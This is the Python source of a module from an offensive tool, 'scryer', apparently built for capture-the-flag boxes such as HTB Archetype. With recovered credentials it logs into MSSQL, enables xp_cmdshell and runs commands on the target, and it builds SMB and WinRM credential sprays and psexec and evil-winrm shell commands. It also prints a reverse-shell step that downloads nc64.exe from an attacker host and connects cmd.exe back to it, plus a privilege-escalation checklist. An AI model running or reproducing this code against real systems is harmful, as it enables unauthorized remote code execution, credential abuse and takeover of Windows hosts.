"""Windows post-credential attacks (opt-in, --exploit).

Once scryer recovers a credential (from a looted SMB share, a config file, a
cracked hash) on a Windows target, this turns it into action:

  * MSSQL (1433): if the account is sysadmin, enable xp_cmdshell and run a
    flag-hunt through Impacket's mssqlclient (best-effort; needs impacket), and
    always print the exact command sequence.
  * SMB/WinRM (445/5985): print ready netexec spray + Impacket psexec/wmiexec +
    evil-winrm commands with the recovered creds.
  * Windows privesc methodology: PowerShell history, SeImpersonate -> potato.

The auto-run pieces are best-effort and Windows-target-specific; the printed
commands are the reliable deliverable.
"""

from __future__ import annotations

import os
import re
import tempfile
from typing import List, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding
from ...data import knowledge

_COMMON_USERS = ["sql_svc", "sa", "administrator", "svc_sql", "mssql"]
# Flag-hunt run through xp_cmdshell — several paths so it works whatever the
# service account is. %USERPROFILE% expands to the running user's home.
_FLAG_CMDS = [
    "whoami",
    r"type %USERPROFILE%\Desktop\user.txt",
    r"type %USERPROFILE%\Desktop\root.txt",
    r"type C:\Users\sql_svc\Desktop\user.txt",
    ('powershell -c "gci C:\\Users -Recurse -Force -Include user.txt,root.txt '
     '-EA 0 | %{$_.FullName; gc $_.FullName}"'),
]


def run(host: HostReport, opts) -> None:
    if not getattr(opts, "exploit", False):
        return
    ports = {e["port"] for e in host.open_ports}
    windows = bool({135, 139, 445, 1433, 3389, 5985} & ports) or \
        (host.os_guess and "windows" in host.os_guess.lower())
    if not windows:
        return
    triples = _cred_pairs(host)   # (domain, user, pw)
    if not triples:
        return
    ip = host.resolved_ip
    utils.section(f"WINDOWS ATTACK {ip}")

    if 1433 in ports:
        d0, u0, p0 = triples[0]
        host.add(Finding(
            title="MSSQL: try xp_cmdshell RCE with recovered creds",
            detail=f"impacket-mssqlclient {d0 or '.'}/{u0}:'{p0}'@{ip} "
                   "-windows-auth\nThen: enable_xp_cmdshell; xp_cmdshell whoami. "
                   "sysadmin -> RCE. scryer auto-attempts every recovered cred "
                   "with impacket.",
            severity="high", category="access", port=1433, service="mssql",
            evidence=f"{u0}:{p0}"))
        client = tooling.resolve("impacket-mssqlclient") or tooling.resolve("mssqlclient.py")
        if not client:
            utils.log("dim", "impacket-mssqlclient not installed — run the printed "
                             "command by hand", indent=1)
        else:
            for dom, user, pw in triples:
                if _mssql(host, ip, dom, user, pw, client):
                    break

    _spray_and_shells(host, ip, ports, triples)
    _privesc_notes(host, ip)


# --- MSSQL ------------------------------------------------------------------
def _mssql(host, ip, dom, user, pw, client) -> bool:
    # Build a de-duplicated target list, trying the credential's own domain
    # first (ARCHETYPE/sql_svc), then local (./sql_svc), then bare. This is the
    # fix for HTB Archetype: the dtsConfig cred is ARCHETYPE\sql_svc and only
    # the domain-qualified form authenticates.
    targets, seen = [], set()
    for d in (dom, ".", ""):
        t = (f"{d}/{user}" if d else user) + f":{pw}@{ip}"
        if t not in seen:
            seen.add(t)
            targets.append((d, t))

    script = ("EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
              "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
              + "".join(f"EXEC xp_cmdshell '{c}';\n" for c in _FLAG_CMDS))
    sf = os.path.join(tempfile.gettempdir(), f"scryer_mssql_{user}.sql")
    try:
        with open(sf, "w") as fh:
            fh.write(script)
    except OSError:
        return False

    for d, target in targets:
        utils.log("info", f"mssqlclient {d or '.'}/{user}@{ip} ...", indent=1)
        rc, out, err = utils.run([client, target, "-windows-auth", "-file", sf],
                                 timeout=90)
        blob = (out or "") + (err or "")
        low = blob.lower()
        if ("login failed" in low or "status_logon_failure" in low
                or "access denied" in low or not blob.strip()):
            continue   # auth failed with this target form — try the next
        # Authenticated. Did we get command execution?
        cmd_tpl = f"impacket-mssqlclient {d or '.'}/{user}:'{pw}'@{ip} -windows-auth"
        blocked = "blocked access to procedure" in low
        if not blocked:
            utils.log("hot", f"MSSQL xp_cmdshell RCE as {d or '.'}/{user}", indent=1)
            host.add(Finding(
                title=f"RCE via MSSQL xp_cmdshell ({user})",
                detail=f"sysadmin + xp_cmdshell enabled. {cmd_tpl}",
                severity="critical", category="access", port=1433,
                service="mssql", evidence=cmd_tpl))
            host.add(Finding(
                title="MSSQL -> reverse shell (next step)",
                detail="Stage nc: your box `python3 -m http.server 80` + "
                       "`nc -lvnp 443`, then in the SQL shell:\n"
                       "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
                       "http://<LHOST>/nc64.exe -outfile nc64.exe; "
                       ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
                severity="info", category="access", port=1433, service="mssql",
                confidence="potential"))
        else:
            host.add(Finding(
                title=f"MSSQL login works ({user}) but not sysadmin",
                detail=f"{cmd_tpl}\nxp_cmdshell is blocked — you are not sysadmin. "
                       "Try other creds, or impersonation (EXECUTE AS LOGIN).",
                severity="high", category="access", port=1433, service="mssql",
                evidence=cmd_tpl))
        _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})")
        return True   # valid creds — stop trying more accounts
    return False


# --- SMB / WinRM spray + shells --------------------------------------------
def _spray_and_shells(host, ip, ports, triples) -> None:
    lines = []
    for dom, user, pw in triples[:6]:
        dp = f"{dom}/" if dom and dom != "." else ""
        dflag = f" -d {dom}" if dom and dom != "." else ""
        if {139, 445} & ports:
            lines.append(f"netexec smb {ip} -u '{user}' -p '{pw}'{dflag} --shares")
            lines.append(f"impacket-psexec {dp}{user}:'{pw}'@{ip}    # SYSTEM if admin")
            lines.append(f"impacket-wmiexec {dp}{user}:'{pw}'@{ip}")
        if 5985 in ports:
            lines.append(f"netexec winrm {ip} -u '{user}' -p '{pw}'{dflag}")
            lines.append(f"evil-winrm -i {ip} -u '{user}' -p '{pw}'")
    if not lines:
        return
    utils.log("hot", f"{len(triples)} Windows credential(s) — spray + get a shell",
              indent=1)
    host.add(Finding(
        title=f"Windows credential reuse — spray {len(triples)} cred(s)",
        detail="Recovered: "
               + ", ".join(f"{(d + chr(92)) if d else ''}{u}:{p}"
                           for d, u, p in triples[:8])
               + "\n\n" + "\n".join(dict.fromkeys(lines)),
        severity="high", category="access", confidence="potential",
        evidence="\n".join(f"{u}:{p}" for _d, u, p in triples)))


def _privesc_notes(host, ip) -> None:
    host.add(Finding(
        title="Windows privesc checklist (after a shell)",
        detail="1) `whoami /priv` — SeImpersonate/SeAssignPrimaryToken -> "
               "PrintSpoofer/GodPotato -> SYSTEM.\n"
               "2) PowerShell history often has creds:\n"
               "   type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\"
               "ConsoleHost_history.txt\n"
               "3) winPEAS / cmdkey /list / unattend.xml / saved RDP creds.\n"
               "4) Found an admin password? impacket-psexec administrator:'<pw>'@"
               f"{ip}  (or evil-winrm). See notes/windows-privesc.md.",
        severity="info", category="access", confidence="potential"))


# --- helpers ---------------------------------------------------------------
def _harvest_flags(host, blob, source) -> bool:
    got = False
    for tok in knowledge.find_flags(blob or ""):
        got = True
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG ({source})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(title=f"FLAG via {source}", detail=tok,
                         severity="critical", category="flag", service="mssql",
                         evidence=f"{source}: {tok}"))
    return got


def _cred_pairs(host: HostReport) -> List[Tuple[str, str, str]]:
    """(domain, user, password) triples. Real creds (from findings, keeping a
    DOMAIN\\ prefix) come first; then each recovered password paired with common
    service usernames under the box's own domain."""
    triples, seen = [], set()

    def add(domain, user, pw):
        user = (user or "").strip()
        if user and pw and (domain, user, pw) not in seen:
            seen.add((domain, user, pw))
            triples.append((domain, user, pw))

    for f in host.findings:
        if f.category == "cred" and f.evidence and ":" in f.evidence:
            m = re.search(r"(?:([A-Za-z0-9._-]+)\\)?([A-Za-z0-9._$-]+):([^\s]+)$",
                          f.evidence.strip())
            if m:
                add(m.group(1) or "", m.group(2), m.group(3))
    # The box's domain (e.g. ARCHETYPE), from any domain-qualified cred or the
    # discovered NetBIOS/host name.
    box_dom = next((d for d, _u, _p in triples if d), "") or _box_domain(host)
    for pw in host.creds:
        for u in _COMMON_USERS:
            add(box_dom, u, pw)
    return triples


def _box_domain(host: HostReport) -> str:
    for n in host.hostnames:
        nl = n.lower()
        if nl and not _is_ip(nl):
            return nl.split(".")[0]
    return ""


def _is_ip(name: str) -> bool:
    parts = name.split(".")
    return len(parts) == 4 and all(p.isdigit() for p in parts)
